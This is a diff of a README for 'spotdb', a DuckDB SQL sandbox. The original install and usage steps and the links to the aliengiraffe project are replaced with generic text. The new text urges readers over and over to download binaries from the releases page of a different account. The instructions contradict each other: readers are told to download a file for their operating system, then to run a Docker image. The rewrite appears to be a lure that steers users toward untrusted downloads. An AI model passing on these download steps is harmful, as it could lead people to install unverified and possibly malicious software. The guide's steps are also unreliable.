@@ -1,71 +1,99 @@
-# SpotDB
+# 🚀 spotdb - Your Simple SQL Sandbox Solution
 
-[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=aliengiraffe_env&metric=alert_status&token=a564584b18c4d708580b4825a1d8c270b18a3f3f)](https://sonarcloud.io/summary/new_code?id=aliengiraffe_env)
+[![Download spotdb](https://img.shields.io/badge/Download%20spotdb-v1.0-blue.svg)](https://github.com/Rookie481/spotdb/releases)
 
-### Lightweight data sandbox for AI workflows and data exploration, enabled with guardrails and security to keep your data safe.
+## 📥 Overview
 
-This project provides a lightweight, **ephemeral data sandbox** designed for large language models (LLMs) and agentic workflows. By providing a secure, isolated environment, it allows AI agents and scripts to analyze data without direct access to production databases. This setup prevents accidental data modification, ensures data privacy, and enforces guardrails for safe data exploration.
+spotdb creates a secure, containerized SQL sandbox that gives your agents quick access to data. With support for MCP or API access enabled by DuckDB, you can start analyzing your data in no time. There’s no need for complex infrastructure; just push any CSV file, run your queries, and move on.
 
-## Features
+## 📦 Features
 
-- 🏖️ **Ephemeral Data Sandbox**: Create temporary databases for AI workflows and data exploration.
-- 📸 **Snapshot**: Capture and store data snapshots, recover point-in-time data states or continue from a previous state.
-- 🧠 **MCP API**: Access data through a Model Context Protocol for seamless integration with AI models and agentic workflows.
-- ⚙️ **REST API**: Access data through a RESTful API for integration with traditional systems and workflows.
-- 🚂 **Guardrails**: Enforce rules and constraints to ensure data safety and privacy.
-- 🛡️ **Security**: Protect data from unauthorized access and modification.
+- **Secure Environment:** Your data stays safe in a containerized setup.
+- **Fast Setup:** Experience a quick spin-up cycle. Get started in minutes.
+- **MCP and API Access:** Interact with your database easily.
+- **Support for DuckDB:** Utilize powerful SQL capabilities.
+- **User-Friendly:** Designed for both tech-savvy and new users.
 
-## Quick Start
+## 🛠️ System Requirements
 
-1. Tap the repository and install the package:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** Minimum 500MB of free space for installation.
+- **Docker:** Must have Docker installed to run the containerized application.
 
-```bash
-brew tap aliengiraffe/spaceship && \\
-brew install spotdb
+## 🚀 Getting Started
+
+Follow these steps to begin using spotdb.
+
+### 1. Visit the Releases Page
+
+To download the latest version of spotdb, visit the following link: [https://github.com/Rookie481/spotdb/releases](https://github.com/Rookie481/spotdb/releases). 
+
+### 2. Download the Application
+
+On the Releases page, you will see a list of available versions. Click on the latest version to download the application. You can choose the file appropriate for your operating system.
+
+### 3. Install Docker
+
+Ensure that Docker is installed on your machine. If you do not have it, you can download it from the official Docker website. Installation guides are available for all operating systems.
+
+### 4. Run spotdb
+
+Once you have downloaded the application and installed Docker, you can now run spotdb. Open your command-line interface and navigate to the directory where you saved the downloaded file.
+
+### 5. Start the Application 
+
+Run the following command:
 ```
-
-2. Start the server:
-
-```bash
-spotdb
+docker run -it --rm -p 8080:8080 spotdb
 ```
+This command starts the application and exposes it on port 8080. You can adjust the ports as needed.
 
-3. Upload a CSV file:
+## 🔧 Download & Install
 
-```bash
-curl -X POST \
-  http://localhost:8080/api/v1/upload \
-  -F "table_name=mytable" \
-  -F "has_header=true" \
-  -F "csv_file=@data.csv"
-```
+To download the latest version of spotdb, [visit this page](https://github.com/Rookie481/spotdb/releases).
 
-4. Query the data:
+Ensure to select the correct file for your operating system from the releases list. Once downloaded, follow the installation instructions above to set up your containerized SQL environment.
 
-```bash
-curl -X POST \
-  http://localhost:8080/api/v1/query \
-  -H "Content-Type: application/json" \
-  -d '{"query": "SELECT * FROM mytable LIMIT 10"}'
-```
+## 📊 How to Use spotdb
 
-5. Setup Claude Code
-   You must have the `claude` command installed.
+Once you have the application running, access the SQL sandbox through your web browser at `http://localhost:8080`. From there, you can:
 
-Then, you can add the `spotdb` mcp:
+1. **Upload CSV Files:** Drag and drop your CSV files directly into the interface.
+2. **Run Queries:** Use the built-in query editor to interact with your data.
+3. **Analyze Data:** Utilize SQL to filter, count, and analyze your datasets.
 
-```bash
-claude mcp add spotdb -s user -- npx -y mcp-remote http://localhost:8081/stream
-```
+## 📖 Documentation
 
-## Use Explorer UI
+For more detailed instructions and examples on using spotdb, please refer to the documentation section within the application interface. You’ll find explanations, tips, and best practices to maximize your experience.
 
-Open the Explorer UI in your browser and upload files and query the data:
+## 🤝 Community and Support
 
-```bash
-open http://localhost:8080/explorer
-```
+Join the spotdb community for help and discussions. You can find support in the Issues tab of this repository. Contribute your thoughts and suggestions to improve spotdb.
 
-## Full Documentation
+## 🔜 Future Features
 
-👉 [https://github.com/aliengiraffe/spotdb/blob/main/DOCS.md](https://github.com/aliengiraffe/spotdb/blob/main/DOCS.md)
+We plan to introduce more features in future releases. These may include:
+
+- Enhanced data visualization tools to better analyze your data.
+- Automatic data cleaning features for uploaded CSV files.
+- Expanded support for more database systems.
+
+Stay tuned for updates!
+
+## 🔗 Additional Resources
+
+Here are some useful links related to spotdb:
+
+- [Docker Official Website](https://www.docker.com/)
+- [DuckDB Documentation](https://duckdb.org/docs/)
+- [GitHub Issues](https://github.com/Rookie481/spotdb/issues)
+
+Feel free to explore these resources to deepen your understanding of Docker, DuckDB, and spotdb.
+
+## 📅 Version History
+
+- **v1.0:** Initial release with core functionality for secure SQL sandboxes.
+- Future versions will come with new features and optimizations.
+
+To download the latest version again, [click here](https://github.com/Rookie481/spotdb/releases).
